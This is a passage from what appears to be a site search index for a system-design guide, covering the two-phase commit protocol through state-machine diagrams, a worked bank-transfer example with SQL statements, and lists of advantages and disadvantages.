\u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502                  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                           \u2502\n\u2502                  \u2502  INIT    \u2502                           \u2502\n\u2502                  \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518                           \u2502\n\u2502                       \u2502                                 \u2502\n\u2502                       \u2502 Send PREPARE                    \u2502\n\u2502                       \u25bc                                 \u2502\n\u2502                  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                           \u2502\n\u2502            \u250c\u2500\u2500\u2500\u2500\u2192\u2502  WAIT    \u2502                           \u2502\n\u2502            \u2502     \u2502  (for    \u2502                           \u2502\n\u2502            \u2502     \u2502  votes)  \u2502                           \u2502\n\u2502            \u2502     \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518                           \u2502\n\u2502    Timeout \u2502          \u2502                                 \u2502\n\u2502    (ABORT) \u2502          \u2502 All votes received              \u2502\n\u2502            \u2502          \u25bc                                 \u2502\n\u2502            \u2502     \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                           \u2502\n\u2502            \u2502     \u2502 DECIDE   \u2502                           \u2502\n\u2502            \u2502     \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518                           \u2502\n\u2502            \u2502          \u2502                                 \u2502\n\u2502            \u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2510                           \u2502\n\u2502            \u2502    \u2502           \u2502                           \u2502\n\u2502            \u2502    \u25bc           \u25bc                           \u2502\n\u2502            \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                      \u2502\n\u2502            \u2514\u2500\u2502 ABORT  \u2502 \u2502 COMMIT \u2502                      \u2502\n\u2502              \u2514\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518 \u2514\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518                      \u2502\n\u2502                  \u2502          \u2502                           \u2502\n\u2502                  \u2502  Send    \u2502  Send                     \u2502\n\u2502                  \u2502  ABORT   \u2502  COMMIT                   \u2502\n\u2502                  \u2502          \u2502                           \u2502\n\u2502                  \u25bc          \u25bc                           \u2502\n\u2502              \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                       \u2502\n\u2502              \u2502  WAIT FOR ACKS   \u2502                       \u2502\n\u2502              \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                       \u2502\n\u2502                       \u2502                                 \u2502\n\u2502                       \u2502 All ACKs received               \u2502\n\u2502                       \u25bc                                 \u2502\n\u2502                  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                           \u2502\n\u2502                  \u2502   END    \u2502                           \u2502\n\u2502                  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                           \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>State Machine - Participant:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502       2PC PARTICIPANT STATE MACHINE                     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502                  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                           \u2502\n\u2502                  \u2502  INIT    \u2502                           \u2502\n\u2502                  \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518                           \u2502\n\u2502                       \u2502                                 \u2502\n\u2502                       \u2502 Receive PREPARE                 \u2502\n\u2502                       \u25bc                                 \u2502\n\u2502                  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                           \u2502\n\u2502                  \u2502 PREPARE  \u2502                           \u2502\n\u2502                  \u2502 (execute \u2502                           \u2502\n\u2502                  \u2502  &amp; vote) \u2502                           \u2502\n\u2502                  \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2518                           \u2502\n\u2502                       \u2502                                 \u2502\n\u2502                  \u250c\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2510                            \u2502\n\u2502                  \u2502         \u2502                            \u2502\n\u2502         Can      \u25bc         \u25bc       Cannot               \u2502\n\u2502         commit \u250c\u2500\u2500\u2500\u2500\u2500\u2510  \u250c\u2500\u2500\u2500\u2500\u2500\u2510   commit                \u2502\n\u2502         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2502 YES \u2502  \u2502 NO  \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                 \u2502\n\u2502         \u2502      \u2514\u2500\u2500\u252c\u2500\u2500\u2518  \u2514\u2500\u2500\u252c\u2500\u2500\u2518       \u2502                 \u2502\n\u2502         \u2502         \u2502        \u2502          \u2502                 \u2502\n\u2502         \u2502         \u2502 Wait   \u2502 Vote NO  \u2502                 \u2502\n\u2502         \u2502         \u25bc        \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502         \u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510               \u2502     \u2502           \u2502\n\u2502         \u2502    \u2502 READY  \u2502               \u2502     \u2502           \u2502\n\u2502         \u2502    \u2502(blocked\u2502               \u2502     \u2502           \u2502\n\u2502         \u2502    \u2502waiting)\u2502               \u2502     \u2502           \u2502\n\u2502         \u2502    \u2514\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518               \u2502     \u2502           \u2502\n\u2502         \u2502        \u2502                    \u2502     \u2502           \u2502\n\u2502         \u2502   \u250c\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2510               \u2502     \u2502           \u2502\n\u2502         \u2502   \u2502         \u2502               \u2502     \u2502           \u2502\n\u2502         \u2502   \u25bc         \u25bc               \u2502     \u2502           \u2502\n\u2502         \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u2502     \u2502           \u2502\n\u2502         \u2514\u2192\u2502 COMMIT \u2502 \u2502 ABORT  \u2502\u25c4\u2500\u2500\u2500\u2500\u2500\u2518     \u2502           \u2502\n\u2502           \u2514\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518 \u2514\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518            \u2502           \u2502\n\u2502               \u2502          \u2502                 \u2502           \u2502\n\u2502               \u2502 Apply    \u2502 Rollback        \u2502 Rollback  \u2502\n\u2502               \u2502 changes  \u2502 changes         \u2502 changes   \u2502\n\u2502               \u2502          \u2502                 \u2502           \u2502\n\u2502               \u25bc          \u25bc                 \u25bc           \u2502\n\u2502           \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510         \u2502\n\u2502           \u2502           END                    \u2502         \u2502\n\u2502           \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518         \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#62-how-two-phase-commit-works-step-by-step","title":"6.2 How Two-Phase Commit Works (Step-by-Step)","text":"<p>Complete Example: Bank Transfer Across Two Banks</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502    2PC EXAMPLE: TRANSFER $500 ACROSS TWO BANKS          \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Transaction: Transfer $500 from Bank A to Bank B       \u2502\n\u2502                                                         \u2502\n\u2502 Components:                                             \u2502\n\u2502 \u2022 Coordinator: Transaction Manager                      \u2502\n\u2502 \u2022 Participant 1: Bank A Database                        \u2502\n\u2502 \u2022 Participant 2: Bank B Database                        \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Phase 1: Prepare (Voting Phase)</p> <pre><code>Step 1: Coordinator sends PREPARE\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nCoordinator:\n  Log: [TXN-123] BEGIN\n  Action: Send PREPARE to all participants\n\n  Message to Bank A: \"PREPARE TXN-123: Deduct $500 from Account #1001\"\n  Message to Bank B: \"PREPARE TXN-123: Add $500 to Account #2002\"\n\n\nStep 2: Participants execute and vote\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nParticipant: Bank A\n  1. Execute: SELECT balance FROM accounts WHERE id=1001 FOR UPDATE\n     Result: balance = $1000 (sufficient funds)\n\n  2. Execute: UPDATE accounts SET balance = 500 WHERE id=1001\n     (Operation prepared, not committed yet)\n\n  3. Write to log: [TXN-123] PREPARE DEDUCT $500 FROM 1001\n\n  4. Lock: Account #1001 LOCKED\n\n  5. Vote: YES (ready to commit)\n\n  6. Send to coordinator: \"YES - Bank A ready\"\n\n\nParticipant: Bank B\n  1. Execute: SELECT balance FROM accounts WHERE id=2002 FOR UPDATE\n     Result: balance = $300\n\n  2. Execute: UPDATE accounts SET balance = 800 WHERE id=2002\n     (Operation prepared, not committed yet)\n\n  3. Write to log: [TXN-123] PREPARE ADD $500 TO 2002\n\n  4. Lock: Account #2002 LOCKED\n\n  5. Vote: YES (ready to commit)\n\n  6. Send to coordinator: \"YES - Bank B ready\"\n\n\nStep 3: Coordinator collects votes and decides\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nCoordinator:\n  Received votes:\n  \u2022 Bank A: YES\n  \u2022 Bank B: YES\n\n  Decision: All voted YES \u2192 COMMIT\n\n  Log: [TXN-123] DECISION: COMMIT\n  (Write to stable storage - critical!)\n</code></pre> <p>Phase 2: Commit (Decision Phase)</p> <pre><code>Step 4: Coordinator sends decision\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nCoordinator:\n  Action: Broadcast COMMIT to all participants\n\n  Message to Bank A: \"COMMIT TXN-123\"\n  Message to Bank B: \"COMMIT TXN-123\"\n\n\nStep 5: Participants commit\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nParticipant: Bank A\n  1. Write to log: [TXN-123] COMMIT\n\n  2. Apply changes: Make balance = $500 permanent\n\n  3. Release lock: Account #1001 UNLOCKED\n\n  4. Send ACK to coordinator: \"ACK - Bank A committed\"\n\n\nParticipant: Bank B\n  1. Write to log: [TXN-123] COMMIT\n\n  2. Apply changes: Make balance = $800 permanent\n\n  3. Release lock: Account #2002 UNLOCKED\n\n  4. Send ACK to coordinator: \"ACK - Bank B committed\"\n\n\nStep 6: Coordinator finalizes\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nCoordinator:\n  Received ACKs:\n  \u2022 Bank A: ACK\n  \u2022 Bank B: ACK\n\n  Log: [TXN-123] END\n\n  Transaction complete!\n\n\nFINAL STATE:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nBank A Account #1001: $1000 \u2192 $500  (deducted $500) \u2705\nBank B Account #2002: $300  \u2192 $800  (added $500)    \u2705\nTotal: $1300 \u2192 $1300 (conserved) \u2705\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#63-advantages-of-two-phase-commit","title":"6.3 Advantages of Two-Phase Commit","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         2PC ADVANTAGES                                  \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 1. \u2705 ATOMICITY GUARANTEE                               \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 All-or-nothing across nodes        \u2502            \u2502\n\u2502    \u2502 \u2022 No partial commits possible        \u2502            \u2502\n\u2502    \u2502 \u2022 Strong consistency maintained      \u2502            \u2502\n\u2502    \u2502 \u2022 ACID properties preserved          \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 2. \u2705 SIMPLE AND WELL-UNDERSTOOD                        \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Clear protocol, easy to reason     \u2502            \u2502\n\u2502    \u2502 \u2022 Standardized (X/Open XA)           \u2502            \u2502\n\u2502    \u2502 \u2022 Extensive vendor support           \u2502            \u2502\n\u2502    \u2502 \u2022 Decades of production use          \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 3. \u2705 WIDELY IMPLEMENTED                                \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Built into most databases          \u2502            \u2502\n\u2502    \u2502 \u2022 Java JTA/JTS support               \u2502            \u2502\n\u2502    \u2502 \u2022 .NET System.Transactions           \u2502            \u2502\n\u2502    \u2502 \u2022 Application server integration     \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 4. \u2705 CRASH RECOVERY SUPPORT                            \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Coordinator failure recoverable    \u2502            \u2502\n\u2502    \u2502 \u2022 Participant failure recoverable    \u2502            \u2502\n\u2502    \u2502 \u2022 Durable logs enable recovery       \u2502            \u2502\n\u2502    \u2502 \u2022 No data loss after commit          \u2502            \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 5. \u2705 STRONG ISOLATION                                  \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Locks held until commit            \u2502            \u2502\n\u2502    \u2502 \u2022 No dirty reads across nodes        \u2502            \u2502\n\u2502    \u2502 \u2022 Serializable across participants   \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#64-disadvantages-of-two-phase-commit","title":"6.4 Disadvantages of Two-Phase Commit","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         2PC DISADVANTAGES                               \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 1. \u274c BLOCKING PROTOCOL                                 \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Participants block waiting for     \u2502            \u2502\n\u2502    \u2502   coordinator decision               \u2502            \u2502\n\u2502    \u2502 \u2022 Locks held during coordination     \u2502            \u2502\n\u2502    \u2502 \u2022 Reduced availability               \u2502            \u2502\n\u2502    \u2502 \u2022 Poor performance under failures    \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 2. \u274c SINGLE POINT OF FAILURE                           \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Coordinator crash blocks system    \u2502            \u2502\n\u2502    \u2502 \u2022 Participants stuck in READY state  \u2502            \u2502\n\u2502    \u2502 \u2022 Cannot commit or abort until       \u2502            \u2502\n\u2502    \u2502   coordinator recovers               \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 3. \u274c HIGH LATENCY                                      \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Multiple network round trips:      \u2502            \u2502\n\u2502    \u2502   - PREPARE messages                 \u2502            \u2502\n\u2502    \u2502   - Vote responses                   \u2502            \u2502\n\u2502    \u2502   - COMMIT/ABORT messages            \u2502            \u2502\n\u2502    \u2502   - ACK responses                    \u2502            \u2502\n\u2502    \u2502 \u2022 Synchronous (not async)            \u2502            \u2502\n\u2502    \u2502 \u2022 10-100x slower than local          \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 4. \u274c REDUCED THROUGHPUT                                \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 \u2022 Locks held for entire protocol     \u2502            \u2502\n\u2502    \u2502 \u2022 Limits concurrent transactions     \u2502            \u2502\n\u2502    \u2502 \u2022 Coordinator becomes bottleneck     \u2502            \u2502\n\u2502    \u2502 \u2022 Doesn't scale well                 \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 5. \u274c CAP THEOREM TRADE-OFF                             \u2502\n\u2502    